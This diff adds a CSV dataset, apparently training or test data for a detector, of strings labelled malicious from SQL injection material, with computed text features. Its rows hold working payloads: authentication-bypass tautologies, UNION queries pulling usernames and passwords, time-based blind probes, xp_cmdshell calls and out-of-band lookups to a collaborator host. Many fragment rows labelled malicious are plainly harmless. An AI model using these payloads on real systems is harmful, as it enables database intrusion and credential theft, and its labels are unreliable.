@@ -1,0 +1,631 @@
+raw_value,token_type,label,unicode_risk,char_entropy,non_ascii_ratio,homoglyph_count,zero_width_count,script_count,security_score,is_suspicious,matches_sql,matches_shell,precedes_exec,digit_ratio,upper_ratio,special_ratio,source
+`+HERP,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.6667,0.3333,sql_injection
+'||'DERP,STRING,MALICIOUS,LOW,2.5,0.0,0,0,1,0.3,0,0,1,0,0.0,0.5,0.5,sql_injection
+'+'herp,STRING,MALICIOUS,LOW,2.5216,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,sql_injection
+' 'DERP,STRING,MALICIOUS,LOW,2.5216,0.0,0,0,1,0.1,0,0,0,0,0.0,0.5714,0.4286,sql_injection
+'%20'HERP,STRING,MALICIOUS,LOW,2.9477,0.0,0,0,1,0.1,0,0,0,0,0.2222,0.4444,0.3333,sql_injection
+'%2B'HERP,STRING,MALICIOUS,LOW,2.9477,0.0,0,0,1,0.1,0,0,0,0,0.1111,0.5556,0.3333,sql_injection
+page.asp?id=1 or 1=1 -- true,STRING,MALICIOUS,LOW,3.9233,0.0,0,0,1,0.3,0,0,0,0,0.1071,0.0,0.3571,sql_injection
+page.asp?id=1' or 1=1 -- true,STRING,MALICIOUS,LOW,4.0044,0.0,0,0,1,0.3,0,0,0,0,0.1034,0.0,0.3793,sql_injection
+"page.asp?id=1"" or 1=1 -- true",STRING,MALICIOUS,LOW,4.0044,0.0,0,0,1,0.3,0,0,0,0,0.1034,0.0,0.3793,sql_injection
+page.asp?id=1 and 1=2 -- false,STRING,MALICIOUS,LOW,3.9069,0.0,0,0,1,0.3,0,0,0,0,0.1,0.0,0.3333,sql_injection
+SELECT * FROM users WHERE username = 'user' AND password = 'pass';,STRING,MALICIOUS,LOW,4.3843,0.0,0,0,1,0.65,1,1,1,0,0.0,0.2727,0.2879,sql_injection
+' OR '1'='1'--,STRING,MALICIOUS,LOW,2.5495,0.0,0,0,1,0.1,0,0,0,0,0.1429,0.1429,0.7143,sql_injection
+SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';,STRING,MALICIOUS,LOW,4.4301,0.0,0,0,1,0.65,1,1,1,0,0.0278,0.2778,0.4028,sql_injection
+' or 1=1 limit 1 --,STRING,MALICIOUS,LOW,3.1761,0.0,0,0,1,0.1,0,0,0,0,0.1579,0.0,0.4737,sql_injection
+"sql = ""SELECT * FROM admin WHERE pass = '"".md5($password,true).""'"";",STRING,MALICIOUS,LOW,4.8773,0.0,0,0,1,0.65,1,1,1,0,0.0149,0.2239,0.3731,sql_injection
+"sql1 = ""SELECT * FROM admin WHERE pass = '"".md5(""ffifdyop"", true).""'"";",STRING,MALICIOUS,LOW,4.8865,0.0,0,0,1,0.65,1,1,1,0,0.0286,0.2143,0.3857,sql_injection
+"sql1 = ""SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\x1c'"";",STRING,MALICIOUS,HIGH,4.7685,0.082,0,0,1,0.8,1,1,1,0,0.0328,0.2459,0.459,sql_injection
+"admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",STRING,MALICIOUS,LOW,4.8473,0.0,0,0,1,0.35,0,1,0,0,0.2727,0.2208,0.2078,sql_injection
+"SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",STRING,MALICIOUS,LOW,4.5132,0.0,0,0,1,0.65,1,1,1,0,0.0,0.1899,0.2152,sql_injection
+"1' UNION SELECT username, password FROM users --",STRING,MALICIOUS,LOW,4.4856,0.0,0,0,1,0.35,0,1,0,0,0.0208,0.3125,0.2292,sql_injection
+"SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",STRING,MALICIOUS,LOW,4.7876,0.0,0,0,1,0.65,1,1,1,0,0.0084,0.2521,0.2269,sql_injection
+LIMIT CAST((SELECT version()) as numeric),STRING,MALICIOUS,LOW,4.3267,0.0,0,0,1,0.35,0,1,0,0,0.0,0.3659,0.2439,sql_injection
+"ERROR: invalid input syntax for type numeric: ""PostgreSQL 9.5.25 on x86_64-pc-linux-gnu""",STRING,MALICIOUS,LOW,4.9167,0.0,0,0,1,0.3,0,0,0,0,0.0909,0.1023,0.2273,sql_injection
+http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response),STRING,MALICIOUS,LOW,4.612,0.0,0,0,1,0.3,0,0,0,0,0.0448,0.0746,0.2836,sql_injection
+http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error),STRING,MALICIOUS,LOW,4.5746,0.0,0,0,1,0.3,0,0,0,0,0.038,0.0633,0.2658,sql_injection
+http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change),STRING,MALICIOUS,LOW,4.8488,0.0,0,0,1,0.3,0,0,0,0,0.0256,0.141,0.2949,sql_injection
+http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change),STRING,MALICIOUS,LOW,4.8744,0.0,0,0,1,0.3,0,0,0,0,0.0256,0.141,0.2949,sql_injection
+http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response),STRING,MALICIOUS,LOW,4.8674,0.0,0,0,1,0.3,0,0,0,0,0.0115,0.1379,0.2759,sql_injection
+"http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --",STRING,MALICIOUS,LOW,5.0732,0.0,0,0,1,0.3,0,0,0,0,0.0667,0.2267,0.3333,sql_injection
+"http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --",STRING,MALICIOUS,LOW,5.0385,0.0,0,0,1,0.3,0,0,0,0,0.0789,0.2237,0.3289,sql_injection
+' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK,STRING,MALICIOUS,LOW,3.9659,0.0,0,0,1,0.3,0,0,0,0,0.0492,0.4754,0.4098,sql_injection
+' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON,STRING,MALICIOUS,LOW,4.3686,0.0,0,0,1,0.3,0,0,0,0,0.0411,0.4247,0.3562,sql_injection
+' AND SLEEP(5)/*,STRING,MALICIOUS,LOW,3.75,0.0,0,0,1,0.3,0,0,0,0,0.0625,0.5,0.4375,sql_injection
+' AND '1'='1' AND SLEEP(5),STRING,MALICIOUS,LOW,3.5616,0.0,0,0,1,0.3,0,0,0,0,0.1154,0.4231,0.4615,sql_injection
+' ; WAITFOR DELAY '00:00:05' --,STRING,MALICIOUS,LOW,3.8583,0.0,0,0,1,0.5,1,0,1,0,0.1935,0.3871,0.4194,sql_injection
+"BENCHMARK(2000000,MD5(NOW()))",STRING,MALICIOUS,LOW,3.8573,0.0,0,0,1,0.3,0,0,0,0,0.2759,0.4828,0.2414,sql_injection
+"http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",STRING,MALICIOUS,LOW,5.1079,0.0,0,0,1,0.3,0,0,0,0,0.1359,0.3107,0.3592,sql_injection
+LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a'),STRING,MALICIOUS,LOW,4.2221,0.0,0,0,1,0.3,0,0,0,0,0.0,0.7021,0.2766,sql_injection
+SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a',STRING,MALICIOUS,LOW,4.2826,0.0,0,0,1,0.35,0,1,0,0,0.0,0.7119,0.2712,sql_injection
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN'),STRING,MALICIOUS,LOW,4.7835,0.0,0,0,1,0.35,0,1,0,0,0.0,0.6154,0.1692,sql_injection
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a',STRING,MALICIOUS,LOW,4.756,0.0,0,0,1,0.5,1,0,0,1,0.0,0.4386,0.2105,sql_injection
+1; EXEC xp_cmdshell('whoami') --,STRING,MALICIOUS,LOW,4.4764,0.0,0,0,1,0.8,1,0,1,1,0.0312,0.125,0.3438,sql_injection
+"SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",STRING,MALICIOUS,LOW,3.6439,0.0,0,0,1,0.3,0,0,0,0,0.0612,0.3061,0.4694,sql_injection
+' union select 0x2720756e696f6e2073656c65637420312c3223#,STRING,MALICIOUS,LOW,4.1015,0.0,0,0,1,0.35,0,1,0,0,0.6071,0.0,0.0893,sql_injection
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a,STRING,MALICIOUS,LOW,3.9559,0.0,0,0,1,0.35,0,1,0,0,0.6897,0.0,0.0776,sql_injection
+Username: attacker'--,STRING,MALICIOUS,LOW,3.6538,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0476,0.2381,sql_injection
+Email: attacker@example.com,STRING,MALICIOUS,LOW,3.8842,0.0,0,0,1,0.3,0,0,0,0,0.0,0.037,0.1481,sql_injection
+"INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');",STRING,MALICIOUS,LOW,4.8159,0.0,0,0,1,0.65,1,1,1,0,0.0,0.1905,0.2857,sql_injection
+"query = ""SELECT * FROM logs WHERE username = '"" + user_from_db + ""'""",STRING,MALICIOUS,LOW,4.5637,0.0,0,0,1,0.35,0,1,0,0,0.0,0.2206,0.3824,sql_injection
+"$pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);",STRING,MALICIOUS,LOW,4.2017,0.0,0,0,1,0.5,1,0,1,0,0.0,0.5556,0.3333,sql_injection
+"$col = '`' . str_replace('`', '``', $_GET['col']) . '`';",STRING,MALICIOUS,LOW,4.1584,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0536,0.6607,sql_injection
+"$stmt = $pdo->prepare(""SELECT $col FROM animals WHERE name = ?"");",STRING,MALICIOUS,LOW,4.7678,0.0,0,0,1,0.65,1,1,1,0,0.0,0.2308,0.3385,sql_injection
+$stmt->execute([$_GET['name']]);,STRING,MALICIOUS,LOW,4.2889,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0938,0.4375,sql_injection
+"$stmt = $pdo->prepare(""SELECT $col FROM animals WHERE name = :name"");",STRING,MALICIOUS,LOW,4.7404,0.0,0,0,1,0.65,1,1,1,0,0.0,0.2174,0.3188,sql_injection
+$stmt->execute(['name' => $_GET['name']]);,STRING,MALICIOUS,LOW,4.3657,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0714,0.4762,sql_injection
+Column not found: 1054 Unknown column ''x' in 'SELECT',STRING,MALICIOUS,LOW,4.1998,0.0,0,0,1,0.35,0,1,0,0,0.0741,0.1481,0.2593,sql_injection
+ALL_PLUGINS,STRING,MALICIOUS,LOW,3.0272,0.0,0,0,1,0.1,0,0,0,0,0.0,0.9091,0.0909,sql_injection
+APPLICABLE_ROLES,STRING,MALICIOUS,LOW,3.3278,0.0,0,0,1,0.1,0,0,0,0,0.0,0.9375,0.0625,sql_injection
+CHARACTER_SETS,STRING,MALICIOUS,LOW,2.9502,0.0,0,0,1,0.1,0,0,0,0,0.0,0.9286,0.0714,sql_injection
+CHECK_CONSTRAINTS,STRING,MALICIOUS,LOW,3.4548,0.0,0,0,1,0.1,0,0,0,0,0.0,0.9412,0.0588,sql_injection
+COLLATIONS,STRING,MALICIOUS,LOW,2.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+COLLATION_CHARACTER_SET_APPLICABILITY,STRING,MALICIOUS,LOW,3.6861,0.0,0,0,1,0.3,0,0,0,0,0.0,0.9189,0.0811,sql_injection
+COLUMNS,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+-- Before $pdo->prepare,STRING,MALICIOUS,LOW,3.3816,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0435,0.3043,sql_injection
+SELECT `\\?#\\0` FROM animals WHERE name = ?,STRING,MALICIOUS,LOW,4.335,0.0,0,0,1,0.35,0,1,0,0,0.0238,0.3571,0.3571,sql_injection
+-- After $pdo->prepare,STRING,MALICIOUS,LOW,3.504,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0455,0.3182,sql_injection
+SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\0` FROM animals WHERE name = ?,STRING,MALICIOUS,LOW,4.9623,0.0,0,0,1,0.65,1,1,1,0,0.0088,0.2389,0.3097,sql_injection
+",",STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,sql_injection
+and,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,sql_injection
+%27,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+%22,STRING,MALICIOUS,LOW,0.9183,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+%23,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+%3B,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+%29,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+%2A,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+%%2727,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+%25%27,STRING,MALICIOUS,LOW,1.9183,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+U+02BA,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.5,0.1667,sql_injection
+U+02B9,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.5,0.3333,0.1667,sql_injection
+%CA%BA,STRING,MALICIOUS,LOW,1.9183,0.0,0,0,1,0.1,0,0,0,0,0.0,0.6667,0.3333,sql_injection
+U+0022,STRING,MALICIOUS,LOW,1.9183,0.0,0,0,1,0.1,0,0,0,0,0.6667,0.1667,0.1667,sql_injection
+%CA%B9,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.1,0,0,0,0,0.1667,0.5,0.3333,sql_injection
+U+0027,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.1,0,0,0,0,0.6667,0.1667,0.1667,sql_injection
+admin' OR '1'='1,STRING,MALICIOUS,LOW,3.25,0.0,0,0,1,0.1,0,0,0,0,0.125,0.125,0.4375,sql_injection
+SLEEP,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+BENCHMARK,STRING,MALICIOUS,LOW,3.1699,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+"conv('a',16,2)=conv('a',16,2)",STRING,MALICIOUS,LOW,3.6166,0.0,0,0,1,0.3,0,0,0,0,0.2069,0.0,0.4483,sql_injection
+connection_id()=connection_id(),STRING,MALICIOUS,LOW,3.2926,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2258,sql_injection
+crc32('MySQL')=crc32('MySQL'),STRING,MALICIOUS,LOW,3.6166,0.0,0,0,1,0.3,0,0,0,0,0.1379,0.2759,0.3103,sql_injection
+BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123),STRING,MALICIOUS,LOW,4.2844,0.0,0,0,1,0.3,0,0,0,0,0.1463,0.6829,0.1707,sql_injection
+@@CONNECTIONS>0,STRING,MALICIOUS,LOW,3.1899,0.0,0,0,1,0.1,0,0,0,0,0.0667,0.7333,0.2,sql_injection
+@@CONNECTIONS=@@CONNECTIONS,STRING,MALICIOUS,LOW,2.9953,0.0,0,0,1,0.1,0,0,0,0,0.0,0.8148,0.1852,sql_injection
+@@CPU_BUSY=@@CPU_BUSY,STRING,MALICIOUS,LOW,3.059,0.0,0,0,1,0.1,0,0,0,0,0.0,0.6667,0.3333,sql_injection
+USER_ID(1)=USER_ID(1),STRING,MALICIOUS,LOW,3.4399,0.0,0,0,1,0.1,0,0,0,0,0.0952,0.5714,0.3333,sql_injection
+ROWNUM=ROWNUM,STRING,MALICIOUS,LOW,2.7774,0.0,0,0,1,0.1,0,0,0,0,0.0,0.9231,0.0769,sql_injection
+RAWTOHEX('AB')=RAWTOHEX('AB'),STRING,MALICIOUS,LOW,3.6166,0.0,0,0,1,0.3,0,0,0,0,0.0,0.6897,0.3103,sql_injection
+LNNVL(0=123),STRING,MALICIOUS,LOW,3.2516,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.4167,0.25,sql_injection
+5::int=5,STRING,MALICIOUS,LOW,2.5,0.0,0,0,1,0.1,0,0,0,0,0.25,0.0,0.375,sql_injection
+5::integer=5,STRING,MALICIOUS,LOW,3.085,0.0,0,0,1,0.1,0,0,0,0,0.1667,0.0,0.25,sql_injection
+pg_client_encoding()=pg_client_encoding(),STRING,MALICIOUS,LOW,3.6622,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2195,sql_injection
+get_current_ts_config()=get_current_ts_config(),STRING,MALICIOUS,LOW,3.7457,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.234,sql_injection
+quote_literal(42.5)=quote_literal(42.5),STRING,MALICIOUS,LOW,4.0034,0.0,0,0,1,0.3,0,0,0,0,0.1538,0.0,0.2308,sql_injection
+current_database()=current_database(),STRING,MALICIOUS,LOW,3.6551,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.1892,sql_injection
+sqlite_version()=sqlite_version(),STRING,MALICIOUS,LOW,3.7111,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2121,sql_injection
+last_insert_rowid()>1,STRING,MALICIOUS,LOW,3.9161,0.0,0,0,1,0.35,0,1,0,0,0.0476,0.0,0.2381,sql_injection
+last_insert_rowid()=last_insert_rowid(),STRING,MALICIOUS,LOW,3.7982,0.0,0,0,1,0.35,0,1,0,0,0.0,0.0,0.2308,sql_injection
+val(cvar(1))=1,STRING,MALICIOUS,LOW,3.0931,0.0,0,0,1,0.1,0,0,0,0,0.1429,0.0,0.3571,sql_injection
+"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0",STRING,MALICIOUS,LOW,3.9455,0.0,0,0,1,0.3,0,0,0,0,0.1818,0.4848,0.3333,sql_injection
+You have an error in your SQL syntax; ... near '' at line 1,STRING,MALICIOUS,LOW,4.0107,0.0,0,0,1,0.5,1,0,1,0,0.0169,0.0678,0.322,sql_injection
+"ERROR: unterminated quoted string at or near ""'""",STRING,MALICIOUS,LOW,4.0272,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1042,0.2292,sql_injection
+"ERROR: syntax error at or near ""1""",STRING,MALICIOUS,LOW,3.716,0.0,0,0,1,0.3,0,0,0,0,0.0294,0.1471,0.2647,sql_injection
+1',STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.1,0,0,0,0,0.5,0.0,0.5,sql_injection
+Unclosed quotation mark after the character string ''.,STRING,MALICIOUS,LOW,4.1133,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0185,0.1852,sql_injection
+Incorrect syntax near ''.,STRING,MALICIOUS,LOW,3.6733,0.0,0,0,1,0.3,0,0,0,0,0.0,0.04,0.24,sql_injection
+|,STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,sql_injection
+ORA-00933: SQL command not properly ended,STRING,MALICIOUS,LOW,4.3666,0.0,0,0,1,0.3,0,0,0,0,0.122,0.1463,0.1707,sql_injection
+ORA-01756: quoted string not properly terminated,STRING,MALICIOUS,LOW,4.4448,0.0,0,0,1,0.3,0,0,0,0,0.1042,0.0625,0.1458,sql_injection
+ORA-00923: FROM keyword not found where expected,STRING,MALICIOUS,LOW,4.4489,0.0,0,0,1,0.35,0,1,0,0,0.1042,0.1458,0.1667,sql_injection
+'1'='1',STRING,MALICIOUS,LOW,1.3788,0.0,0,0,0,0.1,0,0,0,0,0.2857,0.0,0.7143,sql_injection
+LIMIT,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+binary,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,sql_injection
+md5,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.0,0.0,sql_injection
+"md5($password,true)",STRING,MALICIOUS,LOW,3.9321,0.0,0,0,1,0.3,0,0,0,0,0.0526,0.0,0.2105,sql_injection
+' or 'SOMETHING,STRING,MALICIOUS,LOW,3.6402,0.0,0,0,1,0.3,0,0,0,0,0.0,0.6,0.2667,sql_injection
+"'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb",STRING,MALICIOUS,MEDIUM,2.8662,0.3333,0,0,1,0.25,0,0,0,0,0.0667,0.0,0.6667,sql_injection
+'or',STRING,MALICIOUS,LOW,1.5,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,sql_injection
+\xdaT0D\x9f\x8fo#\xdf\xc1'or'8,STRING,MALICIOUS,HIGH,3.6402,0.3333,0,0,1,0.45,0,0,0,0,0.1333,0.2667,0.3333,sql_injection
+Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!,STRING,MALICIOUS,MEDIUM,3.2661,0.3333,0,0,1,0.25,0,0,0,0,0.0,0.0476,0.8095,sql_injection
+'=',STRING,MALICIOUS,LOW,0.9183,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,sql_injection
+\x99\xdc\xdb\xbe}_i\x99\x9ba!8Wm'/*\xb4\xd5,STRING,MALICIOUS,HIGH,4.1427,0.4211,0,0,1,0.45,0,0,0,0,0.0526,0.2105,0.5263,sql_injection
+'/*,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,sql_injection
+\xd9p2\xfbjww\x99%6\\,STRING,MALICIOUS,HIGH,3.2776,0.2727,0,0,1,0.25,0,0,0,0,0.1818,0.0909,0.2727,sql_injection
+UNION,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.15,0,1,0,0,0.0,1.0,0.0,sql_injection
+"SELECT username, password_hash FROM users WHERE username = ?",STRING,MALICIOUS,LOW,4.3733,0.0,0,0,1,0.35,0,1,0,0,0.0,0.25,0.2,sql_injection
+password_hash,STRING,MALICIOUS,LOW,3.027,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0769,sql_injection
+hash(input_password),STRING,MALICIOUS,LOW,3.7842,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.15,sql_injection
+stored_password_hash == hash(input_password),STRING,MALICIOUS,LOW,3.927,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2045,sql_injection
+hash(attacker_supplied_password),STRING,MALICIOUS,LOW,3.9764,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.125,sql_injection
+AND 1=0,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.2857,0.4286,0.2857,sql_injection
+"SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'",STRING,MALICIOUS,LOW,4.5015,0.0,0,0,1,0.35,0,1,0,0,0.38,0.12,0.14,sql_injection
+"MD5(""P@ssw0rd"")",STRING,MALICIOUS,LOW,3.6402,0.0,0,0,1,0.3,0,0,0,0,0.1333,0.2,0.3333,sql_injection
+161ebd7d45089b3446ee4e0d86dbcf92,STRING,MALICIOUS,LOW,3.7028,0.0,0,0,1,0.3,0,0,0,0,0.5938,0.0,0.0,sql_injection
+"""P@ssw0rd""",STRING,MALICIOUS,LOW,2.9219,0.0,0,0,1,0.1,0,0,0,0,0.1,0.1,0.3,sql_injection
+salt,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,sql_injection
+"KDF(salt, password)",STRING,MALICIOUS,LOW,3.8924,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1579,0.2105,sql_injection
+SELECT,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.15,0,1,0,0,0.0,1.0,0.0,sql_injection
+input_id,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.125,sql_injection
+users,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,sql_injection
+version(),STRING,MALICIOUS,LOW,3.1699,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2222,sql_injection
+@@hostname,STRING,MALICIOUS,LOW,3.1219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2,sql_injection
+json(),STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,sql_injection
+' union select 0xHEXVALUE --,STRING,MALICIOUS,LOW,4.2359,0.0,0,0,1,0.35,0,1,0,0,0.0357,0.2857,0.25,sql_injection
+0x2720756e696f6e2073656c65637420312c3223,STRING,MALICIOUS,LOW,3.3215,0.0,0,0,1,0.1,0,0,0,0,0.85,0.0,0.0,sql_injection
+"' union select 1,2#",STRING,MALICIOUS,LOW,3.7871,0.0,0,0,1,0.35,0,1,0,0,0.1053,0.0,0.3158,sql_injection
+is the hex encoded of,STRING,MALICIOUS,LOW,3.3447,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.1905,sql_injection
+PDO::ATTR_EMULATE_PREPARES => true,STRING,MALICIOUS,LOW,4.1163,0.0,0,0,1,0.3,0,0,0,0,0.0,0.6471,0.2353,sql_injection
+"$pdo->prepare(""SELECT $INJECT_SQL_HERE..."")",STRING,MALICIOUS,LOW,4.5165,0.0,0,0,1,0.35,0,1,0,0,0.0,0.4419,0.3256,sql_injection
+or,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,sql_injection
+' . str_replace(',STRING,MALICIOUS,LOW,3.6169,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.4118,sql_injection
+"', $_GET['col']) . '",STRING,MALICIOUS,LOW,3.6842,0.0,0,0,1,0.3,0,0,0,0,0.0,0.15,0.7,sql_injection
+\\0,STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.1,0,0,0,0,0.5,0.0,0.5,sql_injection
+""" or a """,STRING,MALICIOUS,LOW,2.1556,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.625,sql_injection
+?#\\0,STRING,MALICIOUS,LOW,2.0,0.0,0,0,0,0.1,0,0,0,0,0.25,0.0,0.75,sql_injection
+GET /index.php?col=%3f%23%00&name=anything,STRING,MALICIOUS,LOW,4.7077,0.0,0,0,1,0.3,0,0,0,0,0.119,0.0714,0.2381,sql_injection
+'x\\,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.6667,sql_injection
+;#,STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.3,0,0,1,0,0.0,0.0,1.0,sql_injection
+GET /index.php?col=%3f%23%00&name=x%60;%23,STRING,MALICIOUS,LOW,4.6038,0.0,0,0,1,0.5,1,0,1,0,0.2143,0.0714,0.3095,sql_injection
+GET /index2.php?col=\\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+,STRING,MALICIOUS,LOW,5.137,0.0,0,0,1,0.35,0,1,0,0,0.1176,0.2206,0.2794,sql_injection
++from+information_schema.tables)y%3b%2523,STRING,MALICIOUS,LOW,4.4243,0.0,0,0,1,0.35,0,1,0,0,0.122,0.0,0.1707,sql_injection
+FROM (SELECT table_name AS,STRING,MALICIOUS,LOW,4.2099,0.0,0,0,1,0.35,0,1,0,0,0.0,0.4615,0.1923,sql_injection
+\\?#\\0,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,0,0.1,0,0,0,0,0.2,0.0,0.8,sql_injection
+\\'x,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.6667,sql_injection
+?id=1%09and%091=1%09--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.4091,0.0,0.3636,sql_injection
+%09,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.1,0,0,0,0,0.6667,0.0,0.3333,sql_injection
+\\t,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,sql_injection
+?id=1%0Aand%0A1=1%0A--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.2727,0.1364,0.3636,sql_injection
+%0A,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+\\n,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,sql_injection
+?id=1%0Band%0B1=1%0B--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.2727,0.1364,0.3636,sql_injection
+%0B,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+?id=1%0Cand%0C1=1%0C--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.2727,0.1364,0.3636,sql_injection
